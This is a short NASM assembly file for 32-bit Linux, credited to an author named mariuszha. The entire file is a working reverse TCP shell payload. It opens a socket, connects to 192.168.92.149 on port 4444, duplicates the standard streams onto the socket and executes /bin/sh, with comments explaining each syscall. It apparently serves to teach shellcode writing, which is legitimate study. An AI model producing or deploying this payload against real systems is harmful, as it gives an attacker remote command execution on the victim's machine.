; file: shell_reverse_tcp.nasm
; Author: mariuszha
 
 
 
global _start
 
section .text
 
_start:
 

 	; clear registers
	xor eax, eax
	xor ebx, ebx
	xor edx, edx
	xor esi, esi

	mov al, 102 ; __NR_socketcall 102
	mov bl, 1 ; SYS_SOCKET

	; int socket(int domain, int type, int protocol)
	; int socket(AF_INET=2, SOCK_STREAM=1, protocol=0)
	; we push above on the stack with little endian
	push edx
	push ebx
	push 0x2
	mov ecx, esp ; ecx points to args (second argument of socketcall: int socketcall(int call, unsigned long *args))
	int 0x80 ; trigger syscall
	mov esi, eax ; save the socketfd


	; connect
	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	; sockfd = esi, ecx, socklen = 16 bits (push 0x10)
	; (AF_INET=2, sin_port=4444, INADDR_ANY=192.168.92.149) -> ecx pints to args 

	xor eax, eax
	mov al, 102 ; __NR_socketcall 102
	inc ebx
	inc ebx ; SYS_CONNECT (3)
	push dword 0x955ca8c0 ; IP: 192.168.92.149
	push word 0x5c11 ; PORT: 4444
	push word 2 ; AF_INET 2
	mov ecx, esp
	
	push 0x10 ; socklen
	push ecx ; addr
	push esi ; socketfd
	mov ecx, esp ; points to args
    
	int 0x80 ; trigger syscall


	; int dup2(int oldfd, int newfd)
	; ebx = oldfd
	; ecx = stdin=0, stdout=1, stderr=2
	xor ecx, ecx
	mov cl, 2 ; loop counter
	mov ebx, esi ; save client socket
	xor eax, eax

dup2_loop:
	mov al, 0x3F
	int 0x80
	dec ecx
	jns dup2_loop


	; execve /bin/sh
	xor eax, eax
	push eax

	push 0x68732f2f ; hs//
	push 0x6e69622f ; nib/

	mov ebx, esp ; pointer to /bin//sh

	push eax
	mov edx, esp ; NULL terminator

	push ebx
	mov ecx, esp ; /bin//sh, 0

	mov al, 0xb ; __NR_execve 11
	int 0x80 ; trigger syscall
